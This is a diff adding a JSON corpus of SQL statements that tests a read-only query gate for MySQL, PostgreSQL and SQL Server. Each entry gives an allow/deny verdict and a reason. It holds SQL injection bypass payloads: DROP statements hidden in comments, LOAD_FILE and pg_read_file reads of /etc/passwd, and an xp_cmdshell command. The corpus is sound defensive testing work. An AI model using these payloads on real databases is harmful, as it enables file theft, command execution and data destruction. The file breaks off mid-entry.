@@ -1,0 +1,1277 @@
+{
+  "license_notes": [
+    "No third-party payload file is vendored into this repository. Every statement below is written by hand for this corpus; where an entry reproduces a published technique its source names the set the technique came from.",
+    "libinjection (BSD-3-Clause, github.com/libinjection/libinjection) is the structural model for this file: raw input paired with an expected verdict in plain diffable data, the corpus itself being the reviewed artifact. No libinjection data is copied.",
+    "SecLists (MIT, github.com/danielmiessler/SecLists) and PayloadsAllTheThings (MIT, github.com/swisskyrepo/PayloadsAllTheThings) are the sources of the injection techniques relabelled here. Their files are not vendored; the payloads below are rewritten against the three engines this gate serves.",
+    "sqlmap (GPL-2.0, github.com/sqlmapproject/sqlmap) contributed ideas only, from its tamper scripts. No sqlmap code or data is present in this repository."
+  ],
+  "entries": [
+    {
+      "statement": "SELECT 1 /*!DROP TABLE t*/",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "MySQL executes the contents of /*! ... */, so stmt-drop must see the DROP the comment appears to hide",
+      "source": "MySQL manual, Comments: https://dev.mysql.com/doc/refman/8.0/en/comments.html"
+    },
+    {
+      "statement": "SELECT 1 /*!DROP TABLE t*/",
+      "engine": "postgresql",
+      "verdict": "allow",
+      "reason": "the same text is an ordinary block comment outside MySQL, which is why the executable-comment rule is per engine and not universal",
+      "source": "MySQL manual, Comments: https://dev.mysql.com/doc/refman/8.0/en/comments.html"
+    },
+    {
+      "statement": "/*!50000 DELETE FROM t */ SELECT 1",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "a versioned executable comment is live code; stripping comments before scanning is exactly the bypass stmt-delete has to survive",
+      "source": "MySQL manual, Comments: https://dev.mysql.com/doc/refman/8.0/en/comments.html"
+    },
+    {
+      "statement": "SELECT * FROM t /*!50000 UNION SELECT LOAD_FILE('/etc/passwd') */",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "fn-load-file matches inside a versioned executable comment as it would anywhere else",
+      "source": "PayloadsAllTheThings (MIT), MySQL injection techniques, rewritten"
+    },
+    {
+      "statement": "/*!50000SELECT*/ 1",
+      "engine": "mysql",
+      "verdict": "allow",
+      "reason": "the version digits are skipped whether or not whitespace follows them, so the leading keyword is still found by read-select",
+      "source": "MySQL manual, Comments: https://dev.mysql.com/doc/refman/8.0/en/comments.html"
+    },
+    {
+      "statement": "SELECT 1 --DROP TABLE t",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "MySQL needs whitespace after -- for a comment, so this DROP is live code and stmt-drop refuses it",
+      "source": "MySQL manual, Comments: https://dev.mysql.com/doc/refman/8.0/en/comments.html"
+    },
+    {
+      "statement": "SELECT 1 --DROP TABLE t",
+      "engine": "postgresql",
+      "verdict": "allow",
+      "reason": "PostgreSQL has no whitespace requirement after --, so the same text is a comment; one universal -- rule would misjudge one of these two",
+      "source": "PostgreSQL manual, Lexical Structure: https://www.postgresql.org/docs/current/sql-syntax-lexical.html"
+    },
+    {
+      "statement": "SELECT 1 --DROP TABLE t",
+      "engine": "sqlserver",
+      "verdict": "allow",
+      "reason": "T-SQL has no whitespace requirement after -- either",
+      "source": "T-SQL manual, comment syntax: https://learn.microsoft.com/en-us/sql/t-sql/language-elements/comment-transact-sql"
+    },
+    {
+      "statement": "SELECT 1 # DROP TABLE t",
+      "engine": "mysql",
+      "verdict": "allow",
+      "reason": "# introduces a line comment in MySQL only",
+      "source": "MySQL manual, Comments: https://dev.mysql.com/doc/refman/8.0/en/comments.html"
+    },
+    {
+      "statement": "SELECT 1 # DROP TABLE t",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "# is an operator rather than a comment introducer in PostgreSQL, so the DROP is live and stmt-drop refuses it",
+      "source": "MySQL manual, Comments: https://dev.mysql.com/doc/refman/8.0/en/comments.html"
+    },
+    {
+      "statement": "SELECT 1 /* /* */ DROP TABLE t */",
+      "engine": "sqlserver",
+      "verdict": "allow",
+      "reason": "T-SQL block comments nest, so the inner */ does not close the outer comment and nothing after it is code",
+      "source": "T-SQL manual, Slash Star (Block Comment): https://learn.microsoft.com/en-us/sql/t-sql/language-elements/slash-star-comment-transact-sql"
+    },
+    {
+      "statement": "SELECT 1 /* /* */ DROP TABLE t */",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "MySQL block comments do not nest, so the first */ closes the comment and stmt-drop sees the DROP that follows",
+      "source": "T-SQL manual, Slash Star (Block Comment): https://learn.microsoft.com/en-us/sql/t-sql/language-elements/slash-star-comment-transact-sql"
+    },
+    {
+      "statement": "SELECT 1 /* /* */ DROP TABLE t */",
+      "engine": "postgresql",
+      "verdict": "allow",
+      "reason": "PostgreSQL block comments nest, as the SQL standard specifies and unlike C, so the inner */ does not close the outer comment and the DROP is never code",
+      "source": "PostgreSQL manual, Lexical Structure section 4.1.5: https://www.postgresql.org/docs/current/sql-syntax-lexical.html"
+    },
+    {
+      "statement": "SELECT 1 /* /* */ -- */ , dblink_exec('c','DROP TABLE t')",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "fn-dblink-exec, regression for the fail-open found in review: with block comments read as non-nesting the tokenizer ends the comment at the first */, lands on a line-comment introducer the server is still treating as comment, and everything the server does execute after the real */ is hidden from the gate; this is a single statement, so pgx's multi-statement rejection does not catch it either",
+      "source": "PostgreSQL manual, Lexical Structure section 4.1.5: https://www.postgresql.org/docs/current/sql-syntax-lexical.html"
+    },
+    {
+      "statement": "SELECT   /* /* */ -- */ nextval('s')",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "fn-nextval, regression for the fail-open found in review: with block comments read as non-nesting the tokenizer ends the comment at the first */, lands on a line-comment introducer the server is still treating as comment, and everything the server does execute after the real */ is hidden from the gate",
+      "source": "PostgreSQL manual, Lexical Structure section 4.1.5: https://www.postgresql.org/docs/current/sql-syntax-lexical.html"
+    },
+    {
+      "statement": "SELECT 1 /* /* */ -- */ ; DROP TABLE t",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "multiple-statements, regression for the fail-open found in review: with block comments read as non-nesting the tokenizer ends the comment at the first */, lands on a line-comment introducer the server is still treating as comment, and everything the server does execute after the real */ is hidden from the gate",
+      "source": "PostgreSQL manual, Lexical Structure section 4.1.5: https://www.postgresql.org/docs/current/sql-syntax-lexical.html"
+    },
+    {
+      "statement": "SELECT 1 /* /* */ # */ , dblink_exec('c','DROP TABLE t')",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "fn-dblink-exec; the same shape with # in place of --, which is not a comment introducer in PostgreSQL at all and so cannot hide the tail even when the comment is misread",
+      "source": "PostgreSQL manual, Lexical Structure section 4.1.5: https://www.postgresql.org/docs/current/sql-syntax-lexical.html"
+    },
+    {
+      "statement": "SELECT 1 /* /* */ -- */ , dblink_exec('c','DROP TABLE t')",
+      "engine": "mysql",
+      "verdict": "allow",
+      "reason": "MySQL block comments genuinely do not nest, so the first */ really does close the comment and the -- that follows really is a comment; the same text is safe on one engine and a write on another, which is why nesting is a per-dialect flag",
+      "source": "MySQL manual, Comments: https://dev.mysql.com/doc/refman/8.0/en/comments.html"
+    },
+    {
+      "statement": "SELECT * FROM [my]]table]",
+      "engine": "sqlserver",
+      "verdict": "allow",
+      "reason": "a doubled ]] is an escaped bracket inside a T-SQL delimited identifier, not the end of one",
+      "source": "T-SQL manual, Database Identifiers: https://learn.microsoft.com/en-us/sql/relational-databases/databases/database-identifiers"
+    },
+    {
+      "statement": "SELECT * FROM [t]]; DROP TABLE u--]",
+      "engine": "sqlserver",
+      "verdict": "allow",
+      "reason": "the whole bracketed run is one identifier because ]] is an escape; a tokenizer that ended the identifier at the first ] would report a second statement that the server never sees",
+      "source": "PayloadsAllTheThings (MIT), MSSQL injection techniques, rewritten"
+    },
+    {
+      "statement": "SELECT N'DROP TABLE t' AS payload",
+      "engine": "sqlserver",
+      "verdict": "allow",
+      "reason": "N'...' is a national character literal in T-SQL; its contents are data and the leading keyword is still read-select",
+      "source": "T-SQL manual, nchar and nvarchar: https://learn.microsoft.com/en-us/sql/t-sql/data-types/nchar-and-nvarchar-transact-sql"
+    },
+    {
+      "statement": "SELECT N'a''; DROP TABLE t' AS payload",
+      "engine": "sqlserver",
+      "verdict": "allow",
+      "reason": "a doubled quote inside N'...' is content, so the literal runs to the end and hides no statement boundary",
+      "source": "T-SQL manual, nchar and nvarchar: https://learn.microsoft.com/en-us/sql/t-sql/data-types/nchar-and-nvarchar-transact-sql"
+    },
+    {
+      "statement": "SELECT N'DROP TABLE t' AS payload",
+      "engine": "mysql",
+      "verdict": "allow",
+      "reason": "N'...' is valid in MySQL as well",
+      "source": "MySQL manual, National Character Set: https://dev.mysql.com/doc/refman/8.0/en/charset-national.html"
+    },
+    {
+      "statement": "SELECT $$; DROP TABLE t$$ AS payload",
+      "engine": "postgresql",
+      "verdict": "allow",
+      "reason": "a dollar-quoted string takes its contents completely literally, so neither the semicolon nor the DROP is a token",
+      "source": "PostgreSQL manual, Lexical Structure: https://www.postgresql.org/docs/current/sql-syntax-lexical.html"
+    },
+    {
+      "statement": "SELECT $tag$ ; DROP TABLE t $tag$ AS payload",
+      "engine": "postgresql",
+      "verdict": "allow",
+      "reason": "a tagged dollar quote ends only at the identical tag, so the semicolon and the DROP inside it are data",
+      "source": "PostgreSQL manual, Lexical Structure: https://www.postgresql.org/docs/current/sql-syntax-lexical.html"
+    },
+    {
+      "statement": "SELECT $$; DROP TABLE t$$ AS payload",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "MySQL has no dollar quoting, so the semicolon really does separate two statements there",
+      "source": "PostgreSQL manual, Lexical Structure: https://www.postgresql.org/docs/current/sql-syntax-lexical.html"
+    },
+    {
+      "statement": "SELECT $body$ SELECT 1 $body$ AS payload",
+      "engine": "postgresql",
+      "verdict": "allow",
+      "reason": "a second statement-leading keyword inside a dollar-quoted string is not a statement boundary",
+      "source": "PostgreSQL manual, Lexical Structure: https://www.postgresql.org/docs/current/sql-syntax-lexical.html"
+    },
+    {
+      "statement": "SELECT * FROM accounts WHERE id = $1",
+      "engine": "postgresql",
+      "verdict": "allow",
+      "reason": "a dollar-quote tag cannot begin with a digit, so $1 is a positional parameter and the statement is complete",
+      "source": "PostgreSQL manual, Lexical Structure: https://www.postgresql.org/docs/current/sql-syntax-lexical.html"
+    },
+    {
+      "statement": "SELECT $1$ ; DROP TABLE t $1$",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "$1 is a parameter and not the opener of a $1$ quote, so the semicolon is a real separator and the DROP is live code",
+      "source": "PostgreSQL manual, Lexical Structure: https://www.postgresql.org/docs/current/sql-syntax-lexical.html"
+    },
+    {
+      "statement": "SELECT E'\\'; DROP TABLE t; --'",
+      "engine": "postgresql",
+      "verdict": "allow",
+      "reason": "E'...' always processes backslash escapes, so the escaped quote does not end the literal and the whole tail is data",
+      "source": "PostgreSQL manual, Lexical Structure: https://www.postgresql.org/docs/current/sql-syntax-lexical.html"
+    },
+    {
+      "statement": "SELECT '\\'; DROP TABLE t; --'",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "a plain PostgreSQL literal does not process backslash escapes under standard_conforming_strings, so the literal ends early and the DROP that follows is live code",
+      "source": "PostgreSQL manual, Lexical Structure: https://www.postgresql.org/docs/current/sql-syntax-lexical.html"
+    },
+    {
+      "statement": "SELECT '\\'; DROP TABLE t; --'",
+      "engine": "mysql",
+      "verdict": "allow",
+      "reason": "MySQL treats backslash as an escape character inside '...' by default, so the same text is one literal there; a tokenizer written against one dialect finds the wrong end of the string in the other",
+      "source": "MySQL manual, String Literals: https://dev.mysql.com/doc/refman/8.0/en/string-literals.html"
+    },
+    {
+      "statement": "SELECT 'it''s; DROP TABLE t' AS s",
+      "engine": "mysql",
+      "verdict": "allow",
+      "reason": "a doubled quote is content in all three engines, so the literal continues past it and hides no boundary",
+      "source": "MySQL manual, String Literals: https://dev.mysql.com/doc/refman/8.0/en/string-literals.html"
+    },
+    {
+      "statement": "SELECT 'it''s; DROP TABLE t' AS s",
+      "engine": "postgresql",
+      "verdict": "allow",
+      "reason": "doubled-quote escaping holds in PostgreSQL too",
+      "source": "PostgreSQL manual, Lexical Structure: https://www.postgresql.org/docs/current/sql-syntax-lexical.html"
+    },
+    {
+      "statement": "SELECT 'it''s; DROP TABLE t' AS s",
+      "engine": "sqlserver",
+      "verdict": "allow",
+      "reason": "doubled-quote escaping holds in T-SQL too",
+      "source": "T-SQL manual, Constants: https://learn.microsoft.com/en-us/sql/t-sql/data-types/constants-transact-sql"
+    },
+    {
+      "statement": "SELECT \"it\"\"s\" FROM t",
+      "engine": "sqlserver",
+      "verdict": "allow",
+      "reason": "a doubled double quote is content whether the session reads \"...\" as an identifier or as a literal, so the two readings agree on where the token ends",
+      "source": "T-SQL manual, Database Identifiers: https://learn.microsoft.com/en-us/sql/relational-databases/databases/database-identifiers"
+    },
+    {
+      "statement": "SELECT \"pg_read_file\"('/etc/passwd')",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "fn-pg-read-file matches the unquoted content of a delimited identifier, so quoting a forbidden name does not evade it",
+      "source": "PostgreSQL manual, Lexical Structure: https://www.postgresql.org/docs/current/sql-syntax-lexical.html"
+    },
+    {
+      "statement": "SELECT `select` FROM `t`",
+      "engine": "mysql",
+      "verdict": "allow",
+      "reason": "a backquoted identifier is never a keyword, so a column named select does not read as a second statement",
+      "source": "MySQL manual, Schema Object Names: https://dev.mysql.com/doc/refman/8.0/en/identifiers.html"
+    },
+    {
+      "statement": "SELECT U&'d\\0061t' AS x",
+      "engine": "postgresql",
+      "verdict": "allow",
+      "reason": "a U&'...' unicode escape string ends at an undoubled quote regardless of any UESCAPE clause, so its boundary is found correctly",
+      "source": "PostgreSQL manual, Lexical Structure: https://www.postgresql.org/docs/current/sql-syntax-lexical.html"
+    },
+    {
+      "statement": "SELECT U&\"d\\0061t\" FROM t",
+      "engine": "postgresql",
+      "verdict": "allow",
+      "reason": "U&\"...\" is a delimited identifier and its contents are never keywords",
+      "source": "PostgreSQL manual, Lexical Structure: https://www.postgresql.org/docs/current/sql-syntax-lexical.html"
+    },
+    {
+      "statement": "SELECT X'44524f50' AS payload",
+      "engine": "mysql",
+      "verdict": "allow",
+      "reason": "a hexadecimal literal is data; its bytes are not tokenized as keywords",
+      "source": "MySQL manual, Hexadecimal Literals: https://dev.mysql.com/doc/refman/8.0/en/hexadecimal-literals.html"
+    },
+    {
+      "statement": "SELECT 1; SELECT 2",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "multiple-statements: a semicolon followed by more tokens is a second statement",
+      "source": "objective draft, acceptance criterion 3"
+    },
+    {
+      "statement": "SELECT 1; SELECT 2",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "multiple-statements on the semicolon form",
+      "source": "objective draft, acceptance criterion 3"
+    },
+    {
+      "statement": "SELECT 1; SELECT 2",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "multiple-statements on the semicolon form, where TDS would send the whole text as one batch",
+      "source": "objective draft, acceptance criterion 3"
+    },
+    {
+      "statement": "SELECT 1 SELECT 2",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "multiple-statements with no punctuation at all: T-SQL makes semicolons optional, so counting them cannot decide this",
+      "source": "objective draft, acceptance criterion 3"
+    },
+    {
+      "statement": "SELECT 1 SELECT 2",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "the boundary rule is applied on every engine, not only on the one whose driver would forward a stacked statement",
+      "source": "objective draft, acceptance criterion 3"
+    },
+    {
+      "statement": "SELECT 1 SELECT 2",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "the boundary rule is applied on every engine",
+      "source": "objective draft, acceptance criterion 3"
+    },
+    {
+      "statement": "SELECT 1\nDROP TABLE t",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "a newline-separated second statement carries a forbidden keyword, so stmt-drop refuses it before the boundary rule needs to",
+      "source": "objective draft, acceptance criterion 3"
+    },
+    {
+      "statement": "SELECT 1 WHERE 1 = 1 SELECT 2",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "multiple-statements: a statement-leading keyword at parenthesis depth zero with no set operator before it is a new statement",
+      "source": "objective draft, acceptance criterion 3"
+    },
+    {
+      "statement": "SELECT 1 /* ; */ ; DROP TABLE t",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "a separator hidden inside a comment is not one, but the real separator after it is, and the DROP is refused by stmt-drop",
+      "source": "sqlmap (GPL-2.0) tamper-script techniques, idea only"
+    },
+    {
+      "statement": "SELECT 'a; DROP TABLE t' AS s",
+      "engine": "sqlserver",
+      "verdict": "allow",
+      "reason": "a semicolon inside a string literal is data, not a statement separator; refusing this would make the gate unusable without making it safer",
+      "source": "objective draft, acceptance criterion 3"
+    },
+    {
+      "statement": "SELECT 'a; DROP TABLE t' AS s",
+      "engine": "postgresql",
+      "verdict": "allow",
+      "reason": "a semicolon inside a string literal is data on every engine",
+      "source": "objective draft, acceptance criterion 3"
+    },
+    {
+      "statement": "SELECT 1 -- ; DROP TABLE t",
+      "engine": "postgresql",
+      "verdict": "allow",
+      "reason": "a separator inside a line comment is not a separator",
+      "source": "objective draft, acceptance criterion 3"
+    },
+    {
+      "statement": "SELECT 1;;",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "multiple-statements: only a single trailing semicolon is a terminator, a second one begins an empty statement",
+      "source": "hand-written boundary case"
+    },
+    {
+      "statement": "SELECT 1;",
+      "engine": "mysql",
+      "verdict": "allow",
+      "reason": "read-select with a single trailing terminator",
+      "source": "hand-written boundary case"
+    },
+    {
+      "statement": "SELECT 1 UNION ALL SELECT 2",
+      "engine": "mysql",
+      "verdict": "allow",
+      "reason": "a set operator explains a second SELECT at depth zero, so the boundary rule does not misread a union as two statements",
+      "source": "hand-written boundary case"
+    },
+    {
+      "statement": "SELECT id FROM a UNION SELECT id FROM b",
+      "engine": "sqlserver",
+      "verdict": "allow",
+      "reason": "read-select over a union",
+      "source": "hand-written boundary case"
+    },
+    {
+      "statement": "WITH t AS (DELETE FROM x RETURNING *) SELECT * FROM t",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "stmt-delete matches inside a data-modifying CTE, where the outer statement is a plain SELECT and a leading-keyword check alone would pass it",
+      "source": "PostgreSQL manual, WITH Queries: https://www.postgresql.org/docs/current/queries-with.html"
+    },
+    {
+      "statement": "WITH t AS (INSERT INTO x VALUES (1) RETURNING *) SELECT * FROM t",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "stmt-insert matches inside a data-modifying CTE",
+      "source": "PostgreSQL manual, WITH Queries: https://www.postgresql.org/docs/current/queries-with.html"
+    },
+    {
+      "statement": "WITH t AS (UPDATE x SET a = 1 RETURNING *) SELECT * FROM t",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "stmt-update matches inside a data-modifying CTE",
+      "source": "PostgreSQL manual, WITH Queries: https://www.postgresql.org/docs/current/queries-with.html"
+    },
+    {
+      "statement": "WITH c AS (SELECT 1) UPDATE t SET a = 1",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "stmt-update matches in the MySQL CTE shape, where the CTE body is SELECT-shaped and the outer statement is the write",
+      "source": "MySQL manual, WITH (Common Table Expressions): https://dev.mysql.com/doc/refman/8.0/en/with.html"
+    },
+    {
+      "statement": "WITH c AS (SELECT 1) DELETE FROM t WHERE a IN (SELECT * FROM c)",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "stmt-delete matches in the MySQL CTE shape",
+      "source": "MySQL manual, WITH (Common Table Expressions): https://dev.mysql.com/doc/refman/8.0/en/with.html"
+    },
+    {
+      "statement": "WITH recent AS (SELECT id FROM orders WHERE created_at > '2024-01-01') SELECT COUNT(*) FROM recent",
+      "engine": "postgresql",
+      "verdict": "allow",
+      "reason": "read-with over a read-only CTE, the shape the gate must keep usable",
+      "source": "hand-written legitimate read"
+    },
+    {
+      "statement": "WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r WHERE n < 5) SELECT * FROM r",
+      "engine": "postgresql",
+      "verdict": "allow",
+      "reason": "read-with over a recursive CTE; a parenthesised column list after the CTE name is not a function call, and bounding recursion by magnitude belongs to the connection layer",
+      "source": "hand-written legitimate read"
+    },
+    {
+      "statement": "INSERT INTO t (a) VALUES (1)",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "stmt-insert, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "UPDATE t SET a = 1",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "stmt-update, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "DELETE FROM t",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "stmt-delete, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "MERGE INTO target USING src ON target.id = src.id WHEN MATCHED THEN UPDATE SET a = 1",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "stmt-merge, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "REPLACE INTO t (a) VALUES (1)",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "stmt-replace, layer 1; REPLACE as a statement keyword must be refused even though REPLACE() as a function is on the safe-builtin allowlist",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "SELECT REPLACE(name, 'a', 'b') FROM t",
+      "engine": "mysql",
+      "verdict": "allow",
+      "reason": "REPLACE() is a safe builtin; the keyword rule must not swallow the function of the same name",
+      "source": "hand-written legitimate read"
+    },
+    {
+      "statement": "SELECT 1 EXECUTE('xp_cmdshell ''whoami''')",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "stmt-execute; EXECUTE( looks like a function call, and validate refuses any ruleset that puts a name on the safe-builtin allowlist while a forbidden keyword rule of the same name lacks safe_as_function, because such a name would silently disable that rule",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "REPLACE(1, 2, 3)",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "unknown-statement: REPLACE is a safe builtin, so the call form skips the keyword rule, but a statement whose leading keyword is not on the read allowlist is a terminal deny rather than an approval request",
+      "source": "hand-written collision case"
+    },
+    {
+      "statement": "SELECT REPLACE(name, 'a', 'b') FROM t",
+      "engine": "sqlserver",
+      "verdict": "allow",
+      "reason": "read-select: the safe_as_function declaration on stmt-replace is what lets REPLACE() through on every engine while REPLACE INTO stays refused",
+      "source": "hand-written collision case"
+    },
+    {
+      "statement": "CREATE TABLE t (a INT)",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "stmt-create, layer 1 — and the case the cautionary prior art got wrong with startsWith(\"create table\")",
+      "source": "https://github.com/executeautomation/mcp-database-server"
+    },
+    {
+      "statement": "  cReAtE   TaBlE t (a INT)  ",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "stmt-create is matched on the lowercased token, so case and leading whitespace do not evade it",
+      "source": "https://github.com/executeautomation/mcp-database-server"
+    },
+    {
+      "statement": "ALTER TABLE t ADD COLUMN b INT",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "stmt-alter, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "ALTER SYSTEM SET work_mem = '1GB'",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "stmt-alter-system, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "DROP TABLE dbo.orders",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "stmt-drop, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "TRUNCATE TABLE t",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "stmt-truncate, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "RENAME TABLE a TO b",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "stmt-rename, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "EXEC dbo.some_procedure",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "stmt-exec, layer 1; dynamic execution is refused categorically with no per-name allowlist",
+      "source": "recorded decision 01KZQCXWTV8CED2SN4QCVNY6WY"
+    },
+    {
+      "statement": "EXECUTE('DROP TABLE t')",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "stmt-execute; a keyword followed by a parenthesis is only a function call when the name is a known safe builtin, which EXECUTE is not",
+      "source": "recorded decision 01KZQCXWTV8CED2SN4QCVNY6WY"
+    },
+    {
+      "statement": "EXECUTE AS LOGIN = 'sa'",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "stmt-execute-as, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "CALL some_procedure(1)",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "stmt-call, layer 1",
+      "source": "recorded decision 01KZQCXWTV8CED2SN4QCVNY6WY"
+    },
+    {
+      "statement": "PREPARE s FROM 'SELECT 1'",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "stmt-prepare, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "DEALLOCATE PREPARE s",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "stmt-deallocate, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "DO $$ BEGIN PERFORM 1; END $$",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "stmt-do, layer 1: an anonymous code block is uninspectable",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "BEGIN TRANSACTION",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "stmt-begin, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "COMMIT",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "stmt-commit, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "ROLLBACK",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "stmt-rollback, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "SAVE TRANSACTION sp1",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "stmt-save, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "START TRANSACTION",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "stmt-start, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "SET autocommit = 0",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "stmt-set, layer 1: session state the gate's own verdicts depend on",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "USE master",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "stmt-use, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "REVERT",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "stmt-revert, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "GRANT SELECT ON t TO public",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "stmt-grant, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "REVOKE SELECT ON t FROM public",
+      "engine": "postgresql",
+      "verdict": "deny",
+      "reason": "stmt-revoke, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "DENY SELECT ON dbo.t TO guest",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "stmt-deny, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "FLUSH PRIVILEGES",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "stmt-flush, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "RESET QUERY CACHE",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "stmt-reset, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "INSTALL PLUGIN x SONAME 'x.so'",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "stmt-install, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "UNINSTALL PLUGIN x",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "stmt-uninstall, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "LOCK TABLES t WRITE",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "stmt-lock, layer 1: holding locks on a database the user does not own is the degradation the parent objective forbids",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "UNLOCK TABLES",
+      "engine": "mysql",
+      "verdict": "deny",
+      "reason": "stmt-unlock, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "DBCC CHECKDB",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "stmt-dbcc, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
+      "statement": "RECONFIGURE",
+      "engine": "sqlserver",
+      "verdict": "deny",
+      "reason": "stmt-reconfigure, layer 1",
+      "source": "objective draft, Findings: layer 1 statement keywords"
+    },
+    {
